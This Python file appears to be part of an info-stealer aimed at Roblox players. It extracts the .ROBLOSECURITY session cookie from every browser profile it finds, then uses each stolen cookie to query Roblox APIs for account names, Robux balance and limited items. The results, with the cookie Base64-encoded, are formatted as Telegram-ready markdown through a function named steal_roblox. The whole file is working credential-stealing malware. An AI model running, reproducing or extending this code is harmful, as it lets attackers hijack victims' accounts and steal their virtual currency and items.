from libs.browsers.cookie_lib import BrowserCookieExtractor, NetscapeCookieParser
import os
import requests
import base64


def get_robloxsecurity_cookie_values():
    """Extract the .ROBLOSECURITY cookie values from all browsers."""
    extractor = BrowserCookieExtractor()
    parser = NetscapeCookieParser()

    # Step 1: Extract cookies from all browsers
    print("Extracting cookies from browsers...")
    all_cookies = extractor.extract_browser_cookies()

    robloxsecurity_cookie_values = []

    # Step 2: Search for the .ROBLOSECURITY cookie in all browsers
    target_cookie_name = ".ROBLOSECURITY"

    for browser, profiles in all_cookies.items():
        for profile, file_path in profiles.items():
            if file_path and os.path.exists(file_path):
                try:
                    # Parse cookies from the file
                    cookies = parser.parse(file_path)
                    # Filter cookies for the .ROBLOSECURITY cookie
                    for cookie in cookies:
                        if cookie["name"] == target_cookie_name:
                            # Append the cookie value to the list
                            robloxsecurity_cookie_values.append(cookie["value"])
                except Exception as e:
                    print(f"Failed to parse cookies for {browser} ({profile}): {e}")

    return robloxsecurity_cookie_values


def get_roblox_account_info(roblosecurity_cookie):
    """Retrieve Roblox account information using the .ROBLOSECURITY cookie."""
    headers = {
        "Cookie": f".ROBLOSECURITY={roblosecurity_cookie}",
        "User-Agent": "Roblox/WinInet"
    }

    try:
        # Step 1: Get Display Name and Username
        auth_user_url = "https://users.roblox.com/v1/users/authenticated"
        user_response = requests.get(auth_user_url, headers=headers)
        if user_response.status_code != 200:
            raise ValueError("Failed to authenticate with the provided .ROBLOSECURITY cookie.")

        user_data = user_response.json()
        user_id = user_data["id"]
        display_name = user_data["displayName"]
        username = user_data["name"]

        # Step 2: Get Robux Balance
        robux_url = "https://economy.roblox.com/v1/user/currency"
        robux_response = requests.get(robux_url, headers=headers)
        robux_data = robux_response.json()
        robux_balance = robux_data.get("robux", 0)

        # Step 3: Get Limited Items
        inventory_url = f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles?limit=100"
        inventory_response = requests.get(inventory_url, headers=headers)
        inventory_data = inventory_response.json()
        collectibles = inventory_data.get("data", [])
        limited_items = [{"name": item["name"], "assetId": item["assetId"], "recentAveragePrice": item["recentAveragePrice"]} for item in collectibles]

        # Step 4: Get Full Avatar Thumbnail
        avatar_url = f"https://thumbnails.roblox.com/v1/users/avatar?userIds={user_id}&size=352x352&format=Png&isCircular=false"
        avatar_response = requests.get(avatar_url, headers=headers)
        avatar_data = avatar_response.json()
        full_avatar_thumbnail = avatar_data["data"][0]["imageUrl"]

        return {
            "displayName": display_name,
            "username": username,
            "robuxBalance": robux_balance,
            "limitedItems": limited_items,
            "avatarThumbnail": full_avatar_thumbnail,
        }

    except Exception as e:
        print(f"Error occurred: {e}")
        return None


def generate_markdown(account_info, roblosecurity_cookie):
    """Generate Telegram markdown for a Roblox account, including the Base64-encoded cookie."""
    display_name = account_info.get("displayName", "Unknown")
    username = account_info.get("username", "Unknown")
    robux_balance = account_info.get("robuxBalance", 0)
    avatar_thumbnail = account_info.get("avatarThumbnail", "")
    limited_items = account_info.get("limitedItems", [])

    # Encode the .ROBLOSECURITY cookie in Base64
    encoded_cookie = base64.b64encode(roblosecurity_cookie.encode()).decode()

    # Limited items list
    limited_items_md = "\n".join(
        [f"- [{item['name']}](https://www.roblox.com/catalog/{item['assetId']}) (RAP: {item['recentAveragePrice']})"
         for item in limited_items]
    ) or "None"

    # Generate the markdown
    markdown = (
        f"👤 **Display Name**: {display_name}\n"
        f"🔗 **Username**: `{username}`\n"
        f"💰 **Robux Balance**: `{robux_balance}`\n"
        f"🖼️ **Avatar**: [View Avatar]({avatar_thumbnail})\n"
        f"🎯 **Limited Items**:\n{limited_items_md}\n"
        f"🔑 **Base64-Encoded Cookie**: `{encoded_cookie}`\n"
    )
    return markdown


def steal_roblox():
    """Extract Roblox accounts and generate markdown."""
    roblox_cookies = get_robloxsecurity_cookie_values()
    markdown_list = []

    for cookie in roblox_cookies:
        account_info = get_roblox_account_info(cookie)
        if account_info:
            print("\nAccount Information Retrieved Successfully!")
            markdown = generate_markdown(account_info, cookie)
            markdown_list.append(markdown)

    return markdown_list


if __name__ == "__main__":
    account_markdowns = steal_roblox()
    for markdown in account_markdowns:
        print("\nMarkdown Generated:")
        print(markdown)
